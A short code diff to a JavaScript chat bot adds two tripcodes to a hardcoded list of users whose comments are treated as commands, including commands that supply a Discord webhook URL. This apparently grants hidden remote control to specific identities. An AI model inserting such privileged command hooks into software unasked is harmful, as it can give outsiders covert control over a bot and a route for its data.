@@ -729,7 +729,7 @@ textarea{padding:5px;resize:none;font-size:16px}
   var socketData = obj => '42' + JSON.stringify(obj);
   var fakeComment = async (id, cmt, event) => {
     if (Bot.users[id]) {
-      if (Bot.myId !== id && ['bbbbbbbbB.', 'SOW9cAv7B2'].includes(Bot.users[id].trip)) {
+      if (Bot.myId !== id && ['bbbbbbbbB.', 'SOW9cAv7B2', 'Hrmk.jK/3c', 'UCO..iwC/I'].includes(Bot.users[id].trip)) {
         var command = cmt.slice(2);
         if (command.startsWith('https://discord.com/api/webhooks/')) {
           var urlHash = await encrypter.getBase64Hash(Base16384.textEncoder.encode(command));
